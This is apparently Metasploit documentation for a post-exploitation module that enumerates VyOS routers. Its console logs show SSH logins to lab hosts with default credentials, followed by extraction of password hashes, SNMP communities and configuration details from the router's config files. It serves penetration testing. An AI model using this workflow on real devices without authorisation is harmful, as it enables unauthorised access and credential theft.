## Vulnerable Application

This module has been tested on the following hardware/OS combinations.

* VyOS 1.1.8
* VyOS 1.3 (reconfigured to allow ssh password login)

The images are available from VyOS [here](https://downloads.vyos.io/)

This module runs the following commands to gather data:

* equivalent of `show version`
* `cat /config/config`
* `cat /config/config.boot`

This module will look for the follow parameters which contain credentials:

* `snmp community`
* `wireless`
* `login user`

## Verification Steps

1. Start msfconsole
2. Get a shell
3. Do: ```use post/networking/gather/enum_vyos```
4. Do: ```set session [id]```
5. Do: ```set verbose true```
6. Do: ```run```

## Options

## Scenarios

### VyOS 1.1.8 admin

```
resource (vyos.rb)> set username vyos
username => vyos
resource (vyos.rb)> set password vyos
password => vyos
resource (vyos.rb)> run
[+] 2.2.2.2:22 - Success: 'vyos:vyos' 'uid=1000(vyos) gid=100(users) groups=100(users),4(adm),6(disk),27(sudo),30(dip),102(quaggavty),104(vyattacfg),110(fuse) Linux vyos118 3.13.11-1-amd64-vyos #1 SMP Sat Nov 11 12:10:30 CET 2017 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:34571 -> 2.2.2.2:22) at 2020-09-20 15:19:08 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
resource (vyos.rb)> use post/networking/gather/enum_vyos
resource (vyos.rb)> set verbose true
verbose => true
resource (vyos.rb)> set session 1
session => 1
resource (vyos.rb)> run
[!] SESSION may not be compatible with this module.
[*] Getting version information
[+] Version:      VyOS 1.1.8
Description:  VyOS 1.1.8 (helium)
Copyright:    2017 VyOS maintainers and contributors
Built by:     maintainers@vyos.net
Built on:     Sat Nov 11 13:44:36 UTC 2017
Build ID:     1711111344-b483efc
System type:  x86 64-bit
Boot via:     image
Hypervisor:   VMware
HW model:     VMware Virtual Platform
HW S/N:       VMware-56 4d ef 3f af 45 b5 69-27 43 79 f1 93 f4 45 0a
HW UUID:      564DEF3F-AF45-B569-2743-79F193F4450A
Uptime:       19:09:24 up  4:47,  1 user,  load average: 0.01, 0.04, 0.05



[+] Version information stored in to loot /home/h00die/.msf4/loot/20200920151918_default_2.2.2.2_vyos.version_808443.txt
[*] Gathering info from cat /config/config
[*] Gathering info from cat /config/config.boot
[+] 2.2.2.2:22 Username 'jsmith' with level 'operator' with hash $6$b/9HkzK14DtQm3W$UL5z9yGDoX8j13meRLFEGYkn8popOtCa91wwg8qxOFIfQcWBuXQDDiy8NhdPhpnYieBykj1ddytJAwU6C4mrH1
[+] 2.2.2.2:22 Username 'vyos' with level 'admin' with hash $1$hTBP1zOx$M0WnYPshI2piRc7.XnwBU0
[+] 2.2.2.2:22 SNMP Community 'ro' with ro access
[+] 2.2.2.2:22 SNMP Community 'write' with rw access
[+] 2.2.2.2:22 Hostname: vyos118
[+] 2.2.2.2:22 OS Version: VyOS 1.1.8
[+] 2.2.2.2:22 Interface eth1 (00:0c:29:f4:45:14) - 2.2.2.2
[*] Post module execution completed
```

### VyOS 1.1.8 operator (user)

```
resource (vyos.rb)> use auxiliary/scanner/ssh/ssh_login
resource (vyos.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (vyos.rb)> set username jsmith
username => jsmith
resource (vyos.rb)> set password jsmith
password => jsmith
resource (vyos.rb)> run
[+] 2.2.2.2:22 - Success: 'jsmith:jsmith' 'Remote command execution is not allowed for operator level users Remote command execution is not allowed for operator level users '
[*] Command shell session 2 opened (1.1.1.1:46409 -> 2.2.2.2:22) at 2020-09-20 15:19:29 -0400
[-] 2.2.2.2:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (vyos.rb)> use post/networking/gather/enum_vyos
resource (vyos.rb)> set session 2
session => 2
resource (vyos.rb)> run
[!] SESSION may not be compatible with this module.
[*] Getting version information
[+] Version:      VyOS 1.1.8
Description:  VyOS 1.1.8 (helium)
Copyright:    2017 VyOS maintainers and contributors
Built by:     maintainers@vyos.net
Built on:     Sat Nov 11 13:44:36 UTC 2017
Build ID:     1711111344-b483efc
System type:  x86 64-bit
Boot via:     image
Hypervisor:   VMware
HW model:     VMware Virtual Platform
HW S/N:       VMware-56 4d ef 3f af 45 b5 69-27 43 79 f1 93 f4 45 0a
HW UUID:      564DEF3F-AF45-B569-2743-79F193F4450A
Uptime:       19:09:44 up  4:47,  1 user,  load average: 0.00, 0.03, 0.05


[+] Version information stored in to loot /home/h00die/.msf4/loot/20200920151939_default_2.2.2.2_vyos.version_165334.txt
[*] Gathering info from cat /config/config
[*] Gathering info from cat /config/config.boot
[+] 2.2.2.2:22 Username 'jsmith' with level 'operator' with hash $6$b/9HkzK14DtQm3W$UL5z9yGDoX8j13meRLFEGYkn8popOtCa91wwg8qxOFIfQcWBuXQDDiy8NhdPhpnYieBykj1ddytJAwU6C4mrH1
[+] 2.2.2.2:22 Username 'vyos' with level 'admin' with hash $1$hTBP1zOx$M0WnYPshI2piRc7.XnwBU0
[+] 2.2.2.2:22 SNMP Community 'ro' with ro access
[+] 2.2.2.2:22 SNMP Community 'write' with rw access
[+] 2.2.2.2:22 Hostname: vyos118
[+] 2.2.2.2:22 OS Version: VyOS 1.1.8
[+] 2.2.2.2:22 Interface eth1 (00:0c:29:f4:45:14) - 2.2.2.2
[*] Post module execution completed
```

### VyOS 1.3 admin

```
resource (vyos.rb)> use auxiliary/scanner/ssh/ssh_login
resource (vyos.rb)> set rhosts 3.3.3.3
rhosts => 3.3.3.3
resource (vyos.rb)> set username vyos
username => vyos
resource (vyos.rb)> set password vyos
password => vyos
resource (vyos.rb)> run
[+] 3.3.3.3:22 - Success: 'vyos:vyos' 'uid=1003(vyos) gid=100(users) groups=100(users),4(adm),6(disk),27(sudo),30(dip),105(vyattacfg),116(frrvty) Linux vyos13 4.19.142-amd64-vyos #1 SMP Wed Aug 26 18:33:29 UTC 2020 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:42141 -> 3.3.3.3:22) at 2020-09-20 15:33:20 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
resource (vyos.rb)> use post/networking/gather/enum_vyos
resource (vyos.rb)> set verbose true
verbose => true
resource (vyos.rb)> set session 1
session => 1
resource (vyos.rb)> run
[!] SESSION may not be compatible with this module.
[*] Getting version information
[+] 
Version:          VyOS 1.3-rolling-202008270118
Release Train:    equuleus

Built by:         autobuild@vyos.net
Built on:         Thu 27 Aug 2020 01:18 UTC
Build UUID:       b3cfc450-921a-4454-aa8a-eca18c88517b
Build Commit ID:  303a91836dc31c

Architecture:     x86_64
Boot via:         installed image
System type:      VMware guest

Hardware vendor:  VMware, Inc.
Hardware model:   VMware Virtual Platform
Hardware S/N:     Unknown
Hardware UUID:    Unknown

Copyright:        VyOS maintainers and contributors

[+] Version information stored in to loot /home/h00die/.msf4/loot/20200920153335_default_3.3.3.3_vyos.version_336120.txt
[*] Gathering info from cat /config/config
[+] 3.3.3.3:22 SNMP Community 'ro' with ro access
[+] 3.3.3.3:22 SNMP Community 'write' with rw access
[+] 3.3.3.3:22 Hostname: vyos
[+] 3.3.3.3:22 OS Version: 1.3-rolling-202008270118
[+] 3.3.3.3:22 Interface eth0 (00:0c:29:ab:ce:16) - 10.10.10.10 with description: desc two
[+] 3.3.3.3:22 Interface eth1 (00:0c:29:ab:ce:20)
[*] Gathering info from cat /config/config.boot
[+] 3.3.3.3:22 Hostname: vyos13
[+] 3.3.3.3:22 OS Version: 1.3-rolling-202008270118
[+] 3.3.3.3:22 Interface eth1 (00:0c:29:ab:ce:20) - 3.3.3.3
[*] Post module execution completed
```
